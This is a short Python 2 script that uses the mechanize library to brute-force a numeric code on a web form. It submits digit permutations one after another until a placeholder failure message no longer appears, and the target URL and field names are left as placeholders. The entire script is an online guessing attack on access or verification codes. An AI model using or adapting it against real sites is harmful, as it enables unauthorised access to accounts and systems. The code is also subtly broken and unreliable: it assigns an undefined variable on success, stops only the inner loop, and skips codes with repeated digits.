import re
from mechanize import Browser
from itertools import permutations

# Loads a form using the mechanize python plugin, guesses different integer values until it finds the correct one.

def authorize():

	number = "0"

	# Permutations of sizes between 1 and 8! 
	for k in range(1, 8):

		# generates permutations of the string
		# does not find permutations like 0011 where multiple digits repeat

		perms = [''.join(p) for p in permutations('0123456789', k)]
		print "Printing permutations for k = " + str(k)

		for permutation in perms:

			br = Browser()
			br.open("<URL_GOES_HERE>")

			br.form = list(br.forms())[0]

			print "Trying permutation: " + permutation

			br.form["<FIELD_NAME>"] = "<VALUE_FOR_FIELD>"
			br.form["<NAME_OF_CODE_FIELD>"] = permutation
			
			# prints the finished form
			print br.form

			response = br.submit()
			htmlFile = response.get_data()

			# most websites display a message if the code is not successful, replace the field below with this

			if "<FAILURE_MESSAGE>" not in htmlFile:
				number = perm
				break
			else:
				br.back()
	return number 


authorize();